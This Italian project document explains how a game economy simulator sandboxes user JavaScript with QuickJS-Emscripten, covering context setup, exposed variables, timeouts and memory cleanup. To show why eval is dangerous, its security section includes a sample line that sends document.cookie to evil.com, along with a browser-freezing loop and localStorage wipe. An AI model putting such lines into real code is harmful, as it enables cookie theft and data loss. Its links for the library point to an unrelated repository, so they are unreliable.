# QuickJS-Emscripten - Sandboxed JavaScript Execution

## Cos'è QuickJS-Emscripten?

[QuickJS-Emscripten](https://github.com/aspect-build/aspect-cli/blob/main/docs/quickjs.md) è un port WebAssembly (WASM) del motore JavaScript **QuickJS**, compilato tramite Emscripten per essere eseguito nel browser.

- **QuickJS**: Un motore JavaScript leggero e completo creato da Fabrice Bellard (lo stesso creatore di FFmpeg e QEMU)
- **Emscripten**: Toolchain che compila codice C/C++ in WebAssembly
- **Risultato**: Un interprete JavaScript che gira *dentro* JavaScript, completamente isolato

## Perché lo usiamo?

Nel Game Economy Simulator, gli utenti possono scrivere **script JavaScript custom** per definire comportamenti dinamici dei nodi (es. production rate che varia nel tempo).

### Il Problema della Sicurezza

Eseguire codice JavaScript arbitrario con `eval()` o `new Function()` è **estremamente pericoloso**:

```javascript
// ❌ PERICOLOSO - L'utente potrebbe scrivere:
eval("fetch('https://evil.com/steal?data=' + document.cookie)")
eval("while(true) {}") // Blocca il browser
eval("localStorage.clear()") // Cancella i dati
```

### La Soluzione: Sandbox WASM

QuickJS-Emscripten esegue il codice in un **ambiente completamente isolato**:

```javascript
// ✅ SICURO - Il codice gira in una sandbox
// Non ha accesso a:
// - DOM (document, window)
// - Network (fetch, XMLHttpRequest)
// - Storage (localStorage, cookies)
// - File system
// - Qualsiasi API del browser
```

## Come funziona nel progetto

### 1. Inizializzazione (lazy loading)

```typescript
// src/utils/scriptRunner.ts
import { getQuickJS } from 'quickjs-emscripten';

let quickJSPromise: Promise<QuickJSWASMModule> | null = null;

async function getQuickJSInstance() {
  if (!quickJSPromise) {
    quickJSPromise = getQuickJS(); // Carica WASM solo quando serve
  }
  return quickJSPromise;
}
```

### 2. Creazione del contesto sicuro

```typescript
const QuickJS = await getQuickJSInstance();
const vm = QuickJS.newContext(); // Nuovo ambiente isolato
```

### 3. Esposizione di variabili controllate

Solo le variabili che decidiamo noi sono accessibili allo script:

```typescript
// Esponiamo solo ciò che serve
vm.setProp(vm.global, "value", vm.newNumber(context.value));
vm.setProp(vm.global, "tick", vm.newNumber(context.tick));
vm.setProp(vm.global, "total_produced", vm.newNumber(context.total_produced));
vm.setProp(vm.global, "total_consumed", vm.newNumber(context.total_consumed));

// Math object per funzioni matematiche
const mathHandle = vm.newObject();
vm.setProp(mathHandle, "sin", vm.newFunction("sin", (x) => ...));
vm.setProp(mathHandle, "random", vm.newFunction("random", () => ...));
// ... altre funzioni Math
vm.setProp(vm.global, "Math", mathHandle);
```

### 4. Esecuzione con timeout

```typescript
const result = vm.evalCode(userScript, "script.js", {
  timeout: 1000  // Max 1 secondo di esecuzione
});
```

### 5. Cleanup della memoria

QuickJS usa gestione manuale della memoria (come C), quindi dobbiamo rilasciare le risorse:

```typescript
result.value.dispose();
vm.dispose();
```

## Variabili disponibili negli script

| Variabile | Tipo | Descrizione |
|-----------|------|-------------|
| `value` | number | Valore base del nodo (productionRate, capacity, ecc.) |
| `tick` | number | Tick corrente della simulazione (0, 1, 2, ...) |
| `total_produced` | number | Totale risorse prodotte dal nodo |
| `total_consumed` | number | Totale risorse consumate dal nodo |
| `Math` | object | Funzioni matematiche (sin, cos, random, floor, ecc.) |

## Esempi di script

### Production rate crescente
```javascript
// Aumenta di 1 ogni 10 tick
return value + Math.floor(tick / 10);
```

### Oscillazione sinusoidale
```javascript
// Varia tra 5 e 15
return 10 + Math.sin(tick * 0.1) * 5;
```

### Produzione random
```javascript
// Tra 50% e 150% del valore base
return value * (0.5 + Math.random());
```

### Bonus basato sulla produzione totale
```javascript
// +1% per ogni 100 risorse prodotte
return value * (1 + total_produced / 10000);
```

## Vantaggi di QuickJS-Emscripten

| Aspetto | Beneficio |
|---------|-----------|
| **Sicurezza** | Isolamento totale dal browser |
| **Controllo** | Esponiamo solo le variabili che vogliamo |
| **Timeout** | Prevenzione di loop infiniti |
| **Portabilità** | Funziona su tutti i browser moderni |
| **Compatibilità** | Supporta ES2020 JavaScript |
| **Dimensioni** | ~500KB WASM (caricato on-demand) |

## Configurazione Vite

Per far funzionare QuickJS-Emscripten con Vite, è necessario escluderlo dall'ottimizzazione delle dipendenze:

```typescript
// vite.config.ts
export default defineConfig({
  plugins: [react()],
  optimizeDeps: {
    exclude: ['quickjs-emscripten']  // Necessario per WASM
  }
});
```

## Alternative considerate

| Alternativa | Problema |
|-------------|----------|
| `eval()` | Nessun isolamento, accesso totale al browser |
| `new Function()` | Stesso problema di eval |
| Web Workers | Isolati ma hanno ancora accesso a fetch, IndexedDB |
| iframe sandbox | Complesso, problemi di comunicazione |
| **QuickJS-Emscripten** | ✅ Isolamento totale, controllo completo |

## Risorse

- [QuickJS-Emscripten GitHub](https://github.com/aspect-build/aspect-cli)
- [QuickJS Official](https://bellard.org/quickjs/)
- [WebAssembly MDN](https://developer.mozilla.org/en-US/docs/WebAssembly)
